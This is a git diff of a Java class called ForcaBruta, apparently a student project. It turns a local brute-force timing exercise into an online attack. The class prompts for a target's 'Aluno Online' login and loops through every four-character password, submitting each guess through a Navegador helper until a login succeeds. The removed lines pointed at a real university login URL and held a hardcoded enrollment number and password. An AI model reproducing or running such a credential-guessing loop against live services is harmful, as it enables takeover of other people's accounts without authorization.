@@ -1,62 +1,58 @@
 package br.iesb.teoria;
 
 import java.io.FileWriter;
-import java.io.IOException;
 import java.io.PrintWriter;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
-
-import org.jsoup.Jsoup;
-import org.jsoup.nodes.Document;
-import org.jsoup.select.Elements;
+import java.util.Scanner;
 
 public class ForcaBruta {
 
-    private static final int N = 6;
+    private static int N = 4;
     private static double initialTime;
     private static double interval;
-    private static List<Character> senha;
+    private static String usuario;
 
     public static void main(String[] args) throws Exception {
-	senha = new ArrayList<Character>();
-	for (int i = 0; i < N; i++) {
-	    senha.add((char) (Math.random() * 223 + 32));
-	}
-	System.out.println("Senha: " + senha);
+	FileWriter arq = new FileWriter(System.getProperty("user.dir") + "/src/br/iesb/teoria/resultados.txt", true);
+	PrintWriter gravarArq = new PrintWriter(arq);
+	Scanner sc = new Scanner(System.in);
+	System.out.println("Login do Aluno Online: ");
+	usuario = sc.next();
 	initialTime = System.currentTimeMillis();
-	crack(senha);
+	crack();
 	interval = System.currentTimeMillis() - initialTime;
 	System.out.println("Tempo(seg): " + interval / 1000);
-	FileWriter arq = new FileWriter(System.getProperty("user.dir") + "/src/forcabruta/resultados.txt", true);
-	PrintWriter gravarArq = new PrintWriter(arq);
-	gravarArq.println("Senha: " + senha);
-	gravarArq.println("Tempo: " + interval / 1000);
+	gravarArq.println("Tempo(seg): " + interval / 1000);
 	arq.close();
-	try {
-	    Document doc = Jsoup.connect("http://online.iesb.br/aonline/logon.asp").get();
-	    System.out.println("title: " + doc.title());
-	    Elements inputsText = doc.select("input");
-	    inputsText.select("[name=txtnumero_matricula]").attr("value", "1212082005");
-	    inputsText.select("[name=txtsenha_tac]").attr("value", "augusto");
-	} catch (IOException e) {
-	    e.printStackTrace();
-	}
-
+	sc.close();
     }
 
-    private static void crack(List<Character> senha) {
+    private static void crack() {
 	List<Character> bam = new ArrayList<Character>();
 	Integer i;
-	senha.forEach(s -> bam.add((char) 32));
-	while (!bam.equals(senha)) {
+	for (int j = 0; j < N; j++)
+	    bam.add((char) 32);
+	int c2 = 0, c3 = 0, c4 = 0;
+	do {
 	    i = 0;
+	    if (bam.get(1) > 32 && c2 == 0) {
+		c2 = 1;
+		System.out.println("A partir do 2° char!");
+	    } else if (bam.get(2) > 32 && c3 == 0) {
+		c3 = 1;
+		System.out.println("A partir do 3° char!");
+	    } else if (bam.get(3) > 32 && c4 == 0) {
+		c4 = 1;
+		System.out.println("A partir do 4° char!");
+	    }
 	    nextChar(bam, i); // bam[i]++
-	    while ((bam.get(i) == (char) 255) && (i < senha.size())) {
+	    while ((bam.get(i) == (char) 255) && (i < N)) {
 		bam.set(i++, (char) 32);
 		nextChar(bam, i); // bam[i]++
 	    }
-	}
-	System.out.println("crack() → Bam: " + bam + " Senha: " + senha);
+	} while (!Navegador.start(Arrays.asList(usuario, bam.toString())));
     }
 
     private static void nextChar(List<Character> bam, Integer i) {
